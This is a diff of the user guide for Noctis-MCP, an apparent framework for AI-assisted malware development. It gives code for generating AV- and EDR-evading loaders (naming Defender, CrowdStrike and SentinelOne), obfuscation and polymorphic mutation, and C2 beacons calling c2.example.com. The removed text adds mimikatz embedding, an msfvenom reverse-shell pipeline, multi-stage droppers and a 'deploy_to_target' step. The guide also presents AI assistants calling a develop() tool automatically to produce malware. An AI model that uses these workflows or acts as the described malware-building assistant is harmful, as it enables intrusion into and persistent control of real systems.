@@ -1,749 +1,732 @@
 # User Guide
 
-Complete guide to using Noctis-MCP for malware development.
+Complete guide to using Noctis-MCP v2.0 for AI-assisted malware development.
 
 ## Table of Contents
 
-1. [Basic Concepts](#basic-concepts)
-2. [Technique Selection](#technique-selection)
-3. [Code Generation](#code-generation)
-4. [Compilation](#compilation)
-5. [Obfuscation](#obfuscation)
-6. [C2 Integration](#c2-integration)
-7. [OPSEC Analysis](#opsec-analysis)
-8. [Common Workflows](#common-workflows)
+1. [What's New in v2.0](#whats-new-in-v20)
+2. [Quick Start](#quick-start)
+3. [MCP Tools Overview](#mcp-tools-overview)
+4. [Core Workflows](#core-workflows)
+5. [Advanced Usage](#advanced-usage)
+6. [Best Practices](#best-practices)
+7. [Troubleshooting](#troubleshooting)
 
 ---
 
-## Basic Concepts
+## What's New in v2.0
 
-### What is Noctis-MCP?
+### Simplified Workflow
 
-Noctis-MCP is a framework that:
-1. **Indexes** malware techniques from real-world examples
-2. **Assembles** compatible techniques into working code
-3. **Compiles** code into Windows PE executables
-4. **Integrates** with C2 frameworks (Sliver, Havoc, Mythic)
-5. **Obfuscates** code to evade detection
+**Noctis-MCP**: 8 intuitive tools, streamlined AI-driven development
 
-### Core Workflow
+### Key Changes
 
+1. **One-Stop Tool**: `develop()` handles everything - technique selection, code assembly, OPSEC optimization
+2. **Agent-Based Architecture**: 4 specialized AI agents work behind the scenes
+3. **Cursor IDE Integration**: Native MCP support for seamless AI assistance
+4. **Simplified C2**: Just 2 tools (`c2_generate`, `c2_list`) for all C2 frameworks
+5. **Better Documentation**: What each tool does, when to use it, with examples
+
+### Migration Guide
+
+```python
+# Example workflow
+techniques = query_techniques(category='syscalls')
+code = generate_code(techniques)
+code = obfuscate(code)
+code = optimize_opsec(code)
+binary = compile(code)
+
+# NEW v2.0 workflow (simple)
+develop(
+    goal="Create syscall-based loader",
+    target="Windows Defender",
+    auto_compile=True
+)
 ```
-Query Techniques → Select Compatible → Assemble Code → Apply Obfuscation → Compile → Deploy
-```
-
-### Technique IDs
-
-Each technique has a unique ID:
-- `NOCTIS-T001` - API Hashing (DJB2)
-- `NOCTIS-T118` - String Encryption (AES)
-- `NOCTIS-T124` - Indirect Syscalls (HellsHall)
-
-Use these IDs to request specific techniques.
 
 ---
 
-## Technique Selection
+## Quick Start
 
-### Query All Techniques
+### Prerequisites
 
-**Python:**
+1. **Noctis-MCP Server Running**:
+   ```bash
+   cd C:/Users/lewis/Desktop/Noctis-MCP
+   python server/noctis_server.py --port 8888
+   ```
+
+2. **Cursor IDE Configured**:
+   - MCP configuration in `~/.cursor/mcp.json`
+   - Noctis tools should appear in MCP panel
+
+3. **Ask Your AI Assistant**:
+   ```
+   "Create a Windows 11 loader that evades Defender using indirect syscalls"
+   ```
+
+The AI will use the `develop()` tool automatically!
+
+---
+
+## MCP Tools Overview
+
+### 1. `develop()` - Primary Development Tool
+
+**Purpose**: One-stop tool for creating malware from natural language goals.
+
+**When to Use**:
+- Starting a new malware project
+- Need automatic technique selection
+- Want OPSEC optimization
+- Require compilation in one step
+
+**Example**:
 ```python
-import requests
-
-response = requests.get('http://localhost:5000/api/techniques')
-techniques = response.json()['techniques']
-
-for tech in techniques:
-    print(f"{tech['technique_id']}: {tech['name']}")
+develop(
+    goal="Create a process injection loader for Windows 11",
+    target="Windows Defender",
+    auto_compile=True
+)
 ```
 
-**CLI:**
-```bash
-curl http://localhost:5000/api/techniques | jq '.techniques[] | "\(.technique_id): \(.name)"'
+**What It Does**:
+1. Analyzes your goal
+2. Selects compatible techniques (TechniqueSelectionAgent)
+3. Assembles working C code (MalwareDevelopmentAgent)
+4. Optimizes OPSEC (OpsecOptimizationAgent)
+5. Optionally compiles binary
+6. Returns ready-to-use code/binary
+
+**AI Assistant Usage**:
+```
+User: "I need a loader that uses API hashing and syscalls"
+Assistant: [calls develop() tool]
 ```
 
-### Query by Category
+---
 
+### 2. `browse()` - Explore Techniques
+
+**Purpose**: Discover available techniques by category or MITRE ATT&CK TTP.
+
+**When to Use**:
+- Researching available techniques
+- Finding techniques for specific MITRE TTPs
+- Understanding technique capabilities
+
+**Example**:
 ```python
-response = requests.get('http://localhost:5000/api/techniques', params={
-    'category': 'api_hashing'
-})
+# Browse by category
+browse(category="syscalls")
+
+# Browse by MITRE TTP
+browse(mitre_ttp="T1055")
+
+# Get specific technique details
+browse(technique_id="NOCTIS-T124")
 ```
 
-Categories:
-- `api_hashing` - API obfuscation techniques
-- `syscalls` - Direct syscall methods
-- `injection` - Code injection techniques
+**Categories Available**:
+- `api_hashing` - API obfuscation
+- `syscalls` - Direct/indirect syscalls
+- `injection` - Process injection methods
 - `encryption` - Payload encryption
 - `steganography` - Data hiding
 - `persistence` - Persistence mechanisms
 - `unhooking` - EDR unhooking
+- `gpu_evasion` - GPU memory hiding
+- `stack_spoof` - Call stack manipulation
+- `veh` - Exception handler manipulation
 
-### Query by MITRE ATT&CK
-
-```python
-response = requests.get('http://localhost:8888/api/techniques', params={
-    'mitre': 'T1055'  # Process Injection
-})
-
-# Returns all techniques that implement T1055
-techniques = response.json()['techniques']
-print(f"Found {len(techniques)} techniques for T1055")
-# Output: Found 5 techniques for T1055
+**AI Assistant Usage**:
 ```
-
-**Get Complete MITRE Mapping:**
-```python
-response = requests.get('http://localhost:8888/api/mitre')
-mappings = response.json()['mappings']
-
-# Show coverage
-print("MITRE ATT&CK Coverage:")
-for ttp, techniques in mappings.items():
-    print(f"  {ttp}: {len(techniques)} technique(s)")
-```
-
-### Get Technique Details
-
-```python
-tech_id = "NOCTIS-T124"
-response = requests.get(f'http://localhost:5000/api/techniques/{tech_id}')
-details = response.json()
-
-print(f"Name: {details['name']}")
-print(f"Category: {details['category']}")
-print(f"OPSEC Risk: {details['opsec']['detection_risk']}")
-print(f"Compatible with: {details['compatible_with']}")
+User: "What syscall techniques are available?"
+Assistant: [calls browse(category="syscalls")]
 ```
 
 ---
 
-## Code Generation
+### 3. `compile()` - Build Executables
 
-### Generate Simple Loader
+**Purpose**: Compile C source code into Windows PE executables.
 
-**Python:**
+**When to Use**:
+- Manual compilation of code
+- Specific compiler options needed
+- Building from existing source
+
+**Example**:
 ```python
-import requests
-
-response = requests.post('http://localhost:5000/api/generate', json={
-    'techniques': ['NOCTIS-T124', 'NOCTIS-T118'],
-    'target_os': 'Windows 11',
-    'obfuscate': True
-})
-
-code = response.json()['code']
-print(code)
-```
-
-### Generate with Specific Payload
-
-```python
-# Read payload (e.g., mimikatz)
-with open('mimikatz.exe', 'rb') as f:
-    payload = f.read()
-
-# Generate loader with embedded payload
-response = requests.post('http://localhost:5000/api/generate', json={
-    'techniques': ['NOCTIS-T124', 'NOCTIS-T118', 'NOCTIS-T089'],
-    'payload': payload.hex(),
-    'payload_type': 'pe',
-    'obfuscate': True
-})
-```
-
-### Available Techniques by Function
-
-**API Obfuscation:**
-- NOCTIS-T001: DJB2 hashing
-- NOCTIS-T002: ROT13+XOR hashing
-- NOCTIS-T003: CRC32 hashing
-
-**Syscalls:**
-- NOCTIS-T124: HellsHall (indirect)
-- NOCTIS-T125: Trap flag syscalls
-- NOCTIS-T126: Direct syscalls
-
-**Injection:**
-- NOCTIS-T055: Process hollowing
-- NOCTIS-T056: APC injection
-- NOCTIS-T057: Thread pool injection
-- NOCTIS-T089: RunPE
-
-**Encryption:**
-- NOCTIS-T118: AES encryption
-- NOCTIS-T119: XOR encryption
-- NOCTIS-T120: RC4 encryption
-
-**Evasion:**
-- NOCTIS-T201: GPU memory hiding
-- NOCTIS-T202: Stack spoofing
-- NOCTIS-T203: VEH manipulation
-
----
-
-## Compilation
-
-### Compile Code
-
-**Basic Compilation:**
-```python
-response = requests.post('http://localhost:5000/api/compile', json={
-    'source_code': code,
-    'architecture': 'x64',
-    'optimization': 'O2',
-    'output_name': 'loader'
-})
-
-result = response.json()
-print(f"Binary: {result['binary_path']}")
-print(f"Size: {result['size']} bytes")
-print(f"Time: {result['compilation_time']}s")
-```
-
-### Architecture Options
-
-- `x64` - 64-bit (recommended)
-- `x86` - 32-bit (legacy compatibility)
-
-### Optimization Levels
-
-- `O0` - No optimization (debugging)
-- `O1` - Basic optimization
-- `O2` - Full optimization (recommended)
-- `O3` - Aggressive optimization (larger binary)
-
-### Subsystem Options
-
-- `console` - Console application (shows window)
-- `windows` - GUI application (no console)
-
-**Example:**
-```python
-response = requests.post('http://localhost:5000/api/compile', json={
-    'source_code': code,
-    'architecture': 'x64',
-    'optimization': 'O2',
-    'subsystem': 'windows',  # No console window
-    'output_name': 'stealthy_loader'
-})
-```
-
----
-
-## Obfuscation
-
-### String Encryption
-
-**Encrypt all strings in code:**
-```python
-from server.obfuscation.string_encryption import StringEncryptor
-
-encryptor = StringEncryptor(method='aes')
-encrypted_code = encryptor.encrypt_code(source_code)
-```
-
-**Methods:**
-- `xor` - XOR with random key (fast)
-- `aes` - AES-256 encryption (secure)
-- `rc4` - RC4 encryption (balanced)
-
-### API Hashing
-
-**Hash API calls to hide imports:**
-```python
-from server.obfuscation.api_hashing import APIHasher
-
-hasher = APIHasher(algorithm='djb2')
-hashed_code = hasher.hash_apis(source_code)
-```
-
-**Algorithms:**
-- `djb2` - DJB2 hash (common)
-- `rot13xor` - ROT13 + XOR (custom)
-- `crc32` - CRC32 hash (fast)
-
-### Control Flow Flattening
-
-**Make code harder to reverse engineer:**
-```python
-from server.obfuscation.control_flow import flatten_control_flow
-
-flattened_code = flatten_control_flow(
-    source_code,
-    complexity='high'
-)
-```
-
-### Polymorphic Code Generation
-
-**Generate unique code variant:**
-```python
-from server.polymorphic.engine import PolymorphicEngine
-
-engine = PolymorphicEngine()
-variant, stats = engine.generate_variant(
+compile(
     source_code=code,
-    mutation_level='high'
+    architecture="x64",
+    optimization="O2",
+    subsystem="windows"  # No console window
 )
-
-print(f"Variables renamed: {stats['variables_renamed']}")
-print(f"Functions reordered: {stats['functions_reordered']}")
 ```
 
-**Mutation Levels:**
-- `low` - Minor changes (10-20% different)
-- `medium` - Moderate changes (30-50% different)
-- `high` - Major changes (60-80% different)
+**Options**:
+- **Architecture**: `x64` (64-bit), `x86` (32-bit)
+- **Optimization**: `O0` (debug), `O1` (basic), `O2` (recommended), `O3` (aggressive)
+- **Subsystem**: `console` (shows window), `windows` (GUI, no console)
 
-### Combined Obfuscation
-
-```python
-# Full obfuscation pipeline
-from server.obfuscation.string_encryption import StringEncryptor
-from server.obfuscation.api_hashing import APIHasher
-from server.polymorphic.engine import PolymorphicEngine
-
-# 1. Encrypt strings
-encryptor = StringEncryptor(method='aes')
-code = encryptor.encrypt_code(source_code)
-
-# 2. Hash APIs
-hasher = APIHasher(algorithm='djb2')
-code = hasher.hash_apis(code)
-
-# 3. Polymorphic mutation
-engine = PolymorphicEngine()
-code, stats = engine.generate_variant(code, mutation_level='high')
-
-# 4. Compile
-response = requests.post('http://localhost:5000/api/compile', json={
-    'source_code': code,
-    'architecture': 'x64'
-})
+**AI Assistant Usage**:
+```
+User: "Compile this code with maximum optimization"
+Assistant: [calls compile(source_code=..., optimization="O3")]
 ```
 
 ---
 
-## C2 Integration
+### 4. `learn()` - Provide Feedback
 
-See **[C2_INTEGRATION.md](C2_INTEGRATION.md)** for complete C2 setup.
+**Purpose**: Train the AI system by reporting successes/failures.
 
-### Generate Sliver Beacon
+**When to Use**:
+- Binary successfully evaded AV
+- Binary was detected by AV
+- Want to improve future results
 
+**Example**:
 ```python
-from c2_adapters import generate_sliver_beacon
+# Success
+learn(
+    technique_ids=["NOCTIS-T124", "NOCTIS-T118"],
+    feedback_type="success",
+    target="Windows Defender",
+    notes="Evaded detection on Windows 11 build 22631"
+)
 
-result = generate_sliver_beacon(
+# Detection
+learn(
+    technique_ids=["NOCTIS-T001"],
+    feedback_type="detection",
+    target="CrowdStrike",
+    notes="Detected within 30 seconds"
+)
+```
+
+**What It Does**:
+- Updates technique success rates
+- Improves future technique selection
+- Builds AV/EDR detection database
+- Helps community learn
+
+**AI Assistant Usage**:
+```
+User: "The loader was detected by Defender"
+Assistant: [calls learn(feedback_type="detection", target="Windows Defender")]
+```
+
+---
+
+### 5. `files()` - Manage Workspace
+
+**Purpose**: List, read, or delete files in the workspace.
+
+**When to Use**:
+- View generated code
+- Check compiled binaries
+- Clean up workspace
+
+**Example**:
+```python
+# List all files
+files(operation="list")
+
+# Read a file
+files(operation="read", file_path="output/loader.c")
+
+# Delete a file
+files(operation="delete", file_path="output/test.exe")
+```
+
+**Operations**:
+- `list` - Show all workspace files
+- `read` - Read file contents
+- `delete` - Remove file
+
+**AI Assistant Usage**:
+```
+User: "Show me the generated code"
+Assistant: [calls files(operation="read", file_path="output/loader.c")]
+```
+
+---
+
+### 6. `help()` - Get Guidance
+
+**Purpose**: Get contextual help and workflow suggestions.
+
+**When to Use**:
+- New to Noctis-MCP
+- Unsure which tool to use
+- Need workflow examples
+
+**Example**:
+```python
+# General help
+help()
+
+# Specific topic
+help(topic="syscalls")
+help(topic="c2_integration")
+```
+
+**Topics Available**:
+- `workflow` - Common workflows
+- `syscalls` - Syscall techniques
+- `injection` - Process injection
+- `obfuscation` - Code obfuscation
+- `c2_integration` - C2 setup
+- `opsec` - OPSEC best practices
+
+**AI Assistant Usage**:
+```
+User: "How do I create a C2 beacon?"
+Assistant: [calls help(topic="c2_integration")]
+```
+
+---
+
+### 7. `c2_generate()` - Generate C2 Beacons
+
+**Purpose**: Create C2 framework beacons (Sliver, Havoc, Mythic).
+
+**When to Use**:
+- Need a C2 beacon/agent
+- Integrating with C2 frameworks
+- Deploying persistent access
+
+**Example**:
+```python
+c2_generate(
+    framework="sliver",
     listener_host="c2.example.com",
     listener_port=443,
     protocol="https",
     techniques=["NOCTIS-T124", "NOCTIS-T118"],
     obfuscate=True
 )
-
-print(f"Beacon: {result.beacon_path}")
-print(f"Size: {result.beacon_size} bytes")
-print(f"OPSEC: {result.opsec_score}/10")
 ```
 
-### Generate Havoc Demon
+**Frameworks Supported**:
+- `sliver` - Sliver C2
+- `havoc` - Havoc C2
+- `mythic` - Mythic C2
 
-```python
-from c2_adapters import generate_havoc_demon
+**Protocols**:
+- `http` / `https`
+- `dns`
+- `tcp`
+- `mtls`
 
-result = generate_havoc_demon(
-    listener_host="c2.example.com",
-    listener_port=443,
-    protocol="https",
-    sleep_technique="Ekko",  # Advanced sleep obfuscation
-    indirect_syscalls=True,
-    stack_duplication=True,
-    techniques=["NOCTIS-T124"],
-    obfuscate=True
-)
+**AI Assistant Usage**:
+```
+User: "Create a Sliver beacon with HTTPS"
+Assistant: [calls c2_generate(framework="sliver", protocol="https")]
 ```
 
-### Generate Mythic Agent
+**Note**: Requires Kali Linux or WSL with C2 framework installed.
 
+---
+
+### 8. `c2_list()` - List C2 Frameworks
+
+**Purpose**: Show available C2 frameworks and their status.
+
+**When to Use**:
+- Check what C2 frameworks are available
+- Verify C2 framework installation
+- Get C2 configuration details
+
+**Example**:
 ```python
-from c2_adapters import generate_mythic_agent
+c2_list()
+```
 
-result = generate_mythic_agent(
-    listener_host="c2.example.com",
-    listener_port=80,
-    agent_type="apollo",
-    c2_profile="http",
-    api_token="your_mythic_api_token",
-    techniques=["NOCTIS-T124"],
-    obfuscate=True
-)
+**Output**:
+```json
+{
+  "frameworks": [
+    {
+      "name": "sliver",
+      "installed": true,
+      "version": "1.5.42",
+      "listeners": ["https://0.0.0.0:443"]
+    },
+    {
+      "name": "havoc",
+      "installed": false
+    }
+  ]
+}
+```
+
+**AI Assistant Usage**:
+```
+User: "What C2 frameworks can I use?"
+Assistant: [calls c2_list()]
 ```
 
 ---
 
-## OPSEC Analysis
+## Core Workflows
 
-### Analyze Binary
+### Workflow 1: Simple Loader (Beginner)
 
+**Goal**: Create a basic shellcode loader
+
+**Steps**:
 ```python
-from server.opsec_analyzer import analyze_opsec
-
-result = analyze_opsec(binary_path='loader.exe')
-
-print(f"OPSEC Score: {result['score']}/10")
-print("\nIssues found:")
-for issue in result['issues']:
-    print(f"- [{issue['severity']}] {issue['description']}")
-    
-print("\nRecommendations:")
-for rec in result['recommendations']:
-    print(f"- {rec}")
-```
-
-### OPSEC Scoring
-
-**Score Breakdown:**
-- **9-10**: Excellent OPSEC, hard to detect
-- **7-8**: Good OPSEC, some minor issues
-- **5-6**: Moderate OPSEC, several improvements needed
-- **3-4**: Poor OPSEC, easily detected
-- **0-2**: Critical issues, immediate detection likely
-
-**Factors:**
-- String analysis (API names, debug strings)
-- Import table (exposed APIs)
-- Entropy (unencrypted payloads)
-- Known signatures
-- Memory patterns
-
-### Automatic Remediation
-
-```python
-# Analyze and get recommendations
-result = analyze_opsec('loader.exe')
-
-if result['score'] < 8:
-    print("Applying OPSEC improvements...")
-    
-    # Re-obfuscate with recommended changes
-    improved_code = apply_opsec_recommendations(
-        source_code,
-        result['recommendations']
-    )
-    
-    # Recompile
-    recompile(improved_code)
-```
-
----
-
-## Common Workflows
-
-### Workflow 1: Simple Shellcode Loader
-
-```python
-# 1. Select techniques
-techniques = ["NOCTIS-T124", "NOCTIS-T118"]
-
-# 2. Generate code
-response = requests.post('http://localhost:5000/api/generate', json={
-    'techniques': techniques,
-    'target_os': 'Windows 11',
-    'obfuscate': True
-})
-code = response.json()['code']
-
-# 3. Compile
-response = requests.post('http://localhost:5000/api/compile', json={
-    'source_code': code,
-    'architecture': 'x64',
-    'optimization': 'O2'
-})
-
-binary_path = response.json()['binary_path']
-print(f"Loader ready: {binary_path}")
-```
-
-### Workflow 2: C2 Beacon with Obfuscation
-
-```python
-from c2_adapters import generate_sliver_beacon
-
-# Generate beacon with full obfuscation
-result = generate_sliver_beacon(
-    listener_host="c2.example.com",
-    listener_port=443,
-    protocol="https",
+# 1. Use develop() for everything
+result = develop(
+    goal="Create a shellcode loader using indirect syscalls",
+    target="Windows Defender",
     architecture="x64",
-    techniques=[
-        "NOCTIS-T124",  # API hashing
-        "NOCTIS-T118",  # String encryption
-        "NOCTIS-T201"   # GPU hiding
-    ],
+    auto_compile=True
+)
+
+# 2. Done! Binary ready at result['binary_path']
+print(f"Loader: {result['binary_path']}")
+print(f"OPSEC Score: {result['opsec_score']}/10")
+```
+
+**AI Assistant**:
+```
+User: "Create a shellcode loader"
+Assistant: [automatically calls develop()]
+```
+
+---
+
+### Workflow 2: C2 Beacon (Intermediate)
+
+**Goal**: Generate obfuscated Sliver beacon
+
+**Steps**:
+```python
+# 1. Generate beacon
+result = c2_generate(
+    framework="sliver",
+    listener_host="c2.example.com",
+    listener_port=443,
+    protocol="https",
+    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],
     obfuscate=True
 )
 
-if result.success:
-    print(f"Beacon: {result.beacon_path}")
-    print(f"OPSEC: {result.opsec_score}/10")
-    print(f"Techniques: {result.techniques_applied}")
+# 2. Check OPSEC
+if result['opsec_score'] >= 8:
+    print(f"Beacon ready: {result['beacon_path']}")
+else:
+    print("OPSEC too low, adding more techniques...")
 ```
 
-### Workflow 3: MITRE ATT&CK-Based Selection
+**AI Assistant**:
+```
+User: "Create a Sliver HTTPS beacon with good OPSEC"
+Assistant: [calls c2_generate() with appropriate techniques]
+```
 
+---
+
+### Workflow 3: MITRE ATT&CK Testing (Advanced)
+
+**Goal**: Test blue team detection for T1055 (Process Injection)
+
+**Steps**:
 ```python
-# Client requirement: "Test our detection for T1055 (Process Injection)"
+# 1. Find T1055 techniques
+result = browse(mitre_ttp="T1055")
+techniques = [t['technique_id'] for t in result['techniques']]
 
-# 1. Find all T1055 techniques
-response = requests.get('http://localhost:8888/api/techniques', params={'mitre': 'T1055'})
-t1055_techniques = response.json()['techniques']
-
-print(f"Available T1055 techniques: {len(t1055_techniques)}")
-for tech in t1055_techniques:
-    print(f"  - {tech['technique_id']}: {tech['name']}")
-
-# Output:
-# Available T1055 techniques: 5
-#   - NOCTIS-T118: Syscalls
-#   - NOCTIS-T085: Veh
-#   - NOCTIS-T119: Injection
-#   ... etc
+print(f"Found {len(techniques)} techniques for T1055:")
+for t in result['techniques']:
+    print(f"  - {t['technique_id']}: {t['name']}")
 
 # 2. Generate malware using these techniques
-technique_ids = [tech['technique_id'] for tech in t1055_techniques[:3]]
-response = requests.post('http://localhost:8888/api/generate', json={
-    'techniques': technique_ids,
-    'target_os': 'Windows 11',
-    'obfuscate': True
-})
+result = develop(
+    goal="Process injection loader for testing T1055 detection",
+    techniques=techniques,  # Force specific techniques
+    target="CrowdStrike",
+    auto_compile=True
+)
 
-# 3. Report shows MITRE coverage
-print(f"Testing MITRE ATT&CK TTP: T1055 (Process Injection)")
-print(f"Techniques applied: {technique_ids}")
+# 3. Report includes MITRE coverage
+print(f"MITRE TTP: T1055")
+print(f"Techniques: {result['techniques_applied']}")
+print(f"Binary: {result['binary_path']}")
 ```
 
-### Workflow 4: Targeted Malware Development
+**AI Assistant**:
+```
+User: "Create malware to test our T1055 detection rules"
+Assistant: [calls browse(mitre_ttp="T1055"), then develop()]
+```
 
+---
+
+### Workflow 4: Custom Technique Selection (Expert)
+
+**Goal**: Manually select specific techniques
+
+**Steps**:
 ```python
-# For Windows 11 + Defender
-techniques_win11_defender = [
-    "NOCTIS-T124",  # API hashing (T1027.009, T1106)
-    "NOCTIS-T118",  # Syscalls (T1106, T1055)
-    "NOCTIS-T123",  # Encryption (T1027)
-    "NOCTIS-T116"   # Unhooking (T1562.001)
+# 1. Browse available techniques
+syscalls = browse(category="syscalls")
+encryption = browse(category="encryption")
+evasion = browse(category="gpu_evasion")
+
+# 2. Select specific techniques
+selected = [
+    "NOCTIS-T124",  # Indirect syscalls
+    "NOCTIS-T118",  # AES encryption
+    "NOCTIS-T201",  # GPU memory hiding
+    "NOCTIS-T116"   # Unhooking
 ]
 
-# Generate and compile
-response = requests.post('http://localhost:5000/api/generate', json={
-    'techniques': techniques_win11_defender,
-    'target_os': 'Windows 11',
-    'target_av': 'Windows Defender',
-    'obfuscate': True
-})
-
-code = response.json()['code']
-
-# Compile with high optimization
-response = requests.post('http://localhost:5000/api/compile', json={
-    'source_code': code,
-    'architecture': 'x64',
-    'optimization': 'O3',
-    'subsystem': 'windows'
-})
-
-# Analyze OPSEC
-binary = response.json()['binary_path']
-opsec = analyze_opsec(binary)
-
-if opsec['score'] >= 8:
-    print(f"Ready for deployment: {binary}")
-else:
-    print(f"OPSEC score too low ({opsec['score']}), improving...")
-```
-
-### Workflow 4: Multi-Stage Payload
-
-```python
-# Stage 1: Minimal dropper
-stage1_code = generate_code(['NOCTIS-T124'])  # Just API hashing
-compile_code(stage1_code, output='dropper.exe')
-
-# Stage 2: Full-featured loader
-stage2_code = generate_code([
-    'NOCTIS-T124', 'NOCTIS-T118', 'NOCTIS-T125', 'NOCTIS-T201'
-])
-compile_code(stage2_code, output='loader.dll')
-
-# Stage 3: Final payload (C2 beacon)
-beacon = generate_sliver_beacon(
-    listener_host="c2.example.com",
-    listener_port=443,
-    protocol="https",
-    obfuscate=True
+# 3. Develop with specific techniques
+result = develop(
+    goal="Stealth loader for Windows 11 + EDR",
+    techniques=selected,  # Force these techniques
+    target="CrowdStrike",
+    architecture="x64",
+    complexity="high",
+    auto_compile=True
 )
 
-print("Multi-stage payload ready:")
-print(f"  Dropper: dropper.exe")
-print(f"  Loader: loader.dll")
-print(f"  Beacon: {beacon.beacon_path}")
-```
-
----
-
-## Best Practices
-
-### 1. Always Use Obfuscation
-
-```python
-# Good
-result = generate_beacon(..., obfuscate=True)
-
-# Bad
-result = generate_beacon(..., obfuscate=False)
-```
-
-### 2. Check OPSEC Score
-
-```python
-if result.opsec_score < 7:
-    print("Warning: Low OPSEC score")
-    # Add more techniques or improve obfuscation
-```
-
-### 3. Test in Isolated Environment
-
-```python
-# Deploy to test VM first
-deploy_to_vm('test-win11-vm', binary_path)
-
-# Monitor for alerts
-check_av_alerts()
-
-# If clean, proceed to production
-if no_alerts:
-    deploy_to_target(binary_path)
-```
-
-### 4. Use Appropriate Techniques for Target
-
-```python
-# Windows 10
-techniques_win10 = ['NOCTIS-T124', 'NOCTIS-T118']
-
-# Windows 11 + EDR
-techniques_win11_edr = ['NOCTIS-T124', 'NOCTIS-T125', 'NOCTIS-T201', 'NOCTIS-T202']
-```
-
-### 5. Beacon Interval Tuning
-
-```python
-# Active operation (frequent callbacks)
-config = SliverConfig(
-    listener_host="c2.example.com",
-    beacon_interval=30,  # 30 seconds
-    beacon_jitter=20     # 20% jitter
-)
-
-# Persistent (stealth)
-config = SliverConfig(
-    listener_host="c2.example.com",
-    beacon_interval=3600,  # 1 hour
-    beacon_jitter=80       # 80% jitter
+# 4. Provide feedback
+learn(
+    technique_ids=selected,
+    feedback_type="success",  # or "detection"
+    target="CrowdStrike",
+    notes="Evaded detection for 72 hours"
 )
 ```
 
----
-
-## Troubleshooting
-
-### Issue: Compilation Fails
-
-**Check compiler installation:**
-```bash
-# Linux
-x86_64-w64-mingw32-gcc --version
-
-# Windows
-msbuild -version
+**AI Assistant**:
 ```
-
-**Check source code syntax:**
-```python
-# Validate code before compilation
-if validate_c_syntax(code):
-    compile(code)
-```
-
-### Issue: Low OPSEC Score
-
-**Analyze and improve:**
-```python
-result = analyze_opsec(binary)
-
-for issue in result['issues']:
-    if issue['type'] == 'suspicious_string':
-        # Add string encryption
-        code = encrypt_strings(code)
-    elif issue['type'] == 'exposed_import':
-        # Add API hashing
-        code = hash_apis(code)
-
-# Recompile
-recompile(code)
-```
-
-### Issue: C2 Beacon Not Connecting
-
-**Check configuration:**
-```python
-# Verify listener is active
-sliver > jobs
-
-# Test connectivity
-telnet c2.example.com 443
-
-# Check beacon configuration
-print(beacon.config)
+User: "Create a loader using NOCTIS-T124, T118, and T201"
+Assistant: [calls develop(techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"])]
 ```
 
 ---
 
 ## Advanced Usage
 
-### Custom Technique Development
+### Agent-Based Architecture (Under the Hood)
 
-See **[CONTRIBUTING.md](CONTRIBUTING.md)** for creating custom techniques.
+While you use simple tools like `develop()`, v2.0 uses **4 specialized agents** behind the scenes:
+
+1. **TechniqueSelectionAgent**: Chooses best techniques for your goal
+2. **MalwareDevelopmentAgent**: Assembles compatible code
+3. **OpsecOptimizationAgent**: Optimizes for stealth (OPSEC scoring 0-10)
+4. **LearningAgent**: Learns from feedback to improve
+
+**You don't interact with agents directly** - just use `develop()` and the agents work automatically!
+
+### OPSEC Scoring
+
+Every output includes an OPSEC score (0-10):
+
+- **9-10**: Excellent - Hard to detect
+- **7-8**: Good - Minor improvements possible
+- **5-6**: Moderate - Several improvements needed
+- **3-4**: Poor - Easily detected
+- **0-2**: Critical - Immediate detection likely
+
+**Factors**:
+- String analysis (API names, debug strings)
+- Import table (exposed APIs)
+- Entropy (encrypted payloads)
+- Known signatures
+- Memory patterns
+
+**Improving OPSEC**:
+```python
+# Low OPSEC result
+result = develop(goal="Simple loader")
+print(f"OPSEC: {result['opsec_score']}/10")  # Output: 4/10
+
+# Add more techniques for better OPSEC
+result = develop(
+    goal="Simple loader",
+    techniques=["NOCTIS-T124", "NOCTIS-T118", "NOCTIS-T201"],  # More evasion
+    complexity="high"
+)
+print(f"OPSEC: {result['opsec_score']}/10")  # Output: 9/10
+```
+
+### Technique Compatibility
+
+Not all techniques work together. Noctis automatically ensures compatibility:
+
+**Compatible**:
+- API Hashing + Syscalls ✅
+- Encryption + Injection ✅
+- GPU Evasion + Unhooking ✅
+
+**Incompatible**:
+- Direct Syscalls + Indirect Syscalls ❌ (conflicting)
+- Multiple injection methods ❌ (redundant)
+
+The `develop()` tool handles this automatically, but if you force incompatible techniques, you'll get an error.
 
 ### Batch Generation
 
-```python
-# Generate multiple variants
-configs = [
-    {'protocol': 'https', 'port': 443},
-    {'protocol': 'dns', 'domain': 'example.com'},
-    {'protocol': 'mtls', 'port': 8888}
-]
-
-for config in configs:
-    beacon = generate_sliver_beacon(**config)
-    print(f"Generated: {beacon.beacon_path}")
-```
-
-### Integration with Other Tools
+Generate multiple variants for testing:
 
 ```python
-# Generate shellcode for Cobalt Strike
-beacon = generate_sliver_beacon(..., output_format='shellcode')
+targets = ["Windows Defender", "CrowdStrike", "SentinelOne"]
 
-# Use with Metasploit
-msfvenom -p windows/x64/shell_reverse_tcp -f raw | \
-    python noctis_wrapper.py --obfuscate
+for target in targets:
+    result = develop(
+        goal="Loader for AV testing",
+        target=target,
+        auto_compile=True
+    )
+
+    print(f"{target}: {result['binary_path']} (OPSEC: {result['opsec_score']}/10)")
 ```
 
 ---
 
-**Last Updated**: October 3, 2025  
-**Version**: 1.0.0
+## Best Practices
 
+### 1. Always Use `develop()` First
+
+```python
+# Good - Simple and effective
+develop(goal="Create a loader", auto_compile=True)
+
+# Avoid - Unnecessary complexity
+techniques = browse(category="syscalls")
+code = develop(goal="...", techniques=techniques)
+compile(code)
+```
+
+Let the AI agents choose the best techniques!
+
+### 2. Check OPSEC Scores
+
+```python
+result = develop(goal="Loader")
+
+if result['opsec_score'] < 7:
+    print("Warning: Low OPSEC - add more techniques")
+```
+
+### 3. Provide Feedback
+
+```python
+# Help the system learn
+learn(
+    technique_ids=result['techniques_applied'],
+    feedback_type="success",
+    target="Windows Defender"
+)
+```
+
+### 4. Test in Isolated Environment
+
+```bash
+# Never test on production!
+# Use isolated VM or sandbox
+```
+
+### 5. Use Appropriate Targets
+
+```python
+# Specify your actual target
+develop(goal="Loader", target="CrowdStrike")  # Not generic "Windows Defender"
+```
+
+### 6. Leverage MITRE ATT&CK
+
+```python
+# Align with client requirements
+browse(mitre_ttp="T1055")  # Client wants to test T1055 detection
+```
+
+---
+
+## Troubleshooting
+
+### Issue: Tools Not Showing in Cursor
+
+**Fix**:
+1. Check `~/.cursor/mcp.json` configuration
+2. Restart Cursor IDE
